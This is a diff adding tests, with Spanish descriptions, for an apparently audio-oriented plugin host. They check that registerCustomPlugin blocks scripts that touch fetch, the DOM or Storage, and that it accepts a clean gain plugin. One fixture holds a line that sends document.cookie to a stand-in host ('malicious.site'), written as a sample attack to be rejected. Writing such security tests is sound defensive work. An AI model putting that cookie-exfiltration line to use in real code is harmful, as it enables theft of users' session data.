@@ -349,4 +349,42 @@ describe('waveA: seguridad de plugins y operaciones', () => {
     const far = calculateMagneticSnap(0.30, 120, [4, 4], [], 0.02);
     expect(far.isSnapped).toBe(false);
   });
+
+  it('registerCustomPlugin bloquea scripts con acceso a APIs peligrosas (fetch/DOM/Storage)', () => {
+    expect(() => {
+      pluginHost.registerCustomPlugin(`
+        fetch('https://malicious.site/leak?c=' + document.cookie);
+        const customPlugin = { id: 'bad', name: 'Bad', createDSPNode: () => {} };
+      `);
+    }).toThrow(/bloqueado por seguridad/);
+
+    expect(() => {
+      pluginHost.registerCustomPlugin(`
+        window.localStorage.setItem('compromised', 'true');
+        const customPlugin = { id: 'bad2', name: 'Bad 2', createDSPNode: () => {} };
+      `);
+    }).toThrow(/bloqueado por seguridad/);
+  });
+
+  it('registerCustomPlugin admite plugins válidos y seguros', () => {
+    const valid = pluginHost.registerCustomPlugin(`
+      const customPlugin = {
+        id: 'clean_gain',
+        name: 'Clean Gain',
+        version: '1.0.0',
+        parameters: [],
+        createDSPNode: (ctx) => {
+          const g = ctx.createGain();
+          return {
+            instanceId: 'i1',
+            pluginId: 'clean_gain',
+            inputNode: g,
+            outputNode: g,
+            updateParameter: () => {},
+          };
+        }
+      };
+    `);
+    expect(valid.id).toBe('clean_gain');
+  });
 });
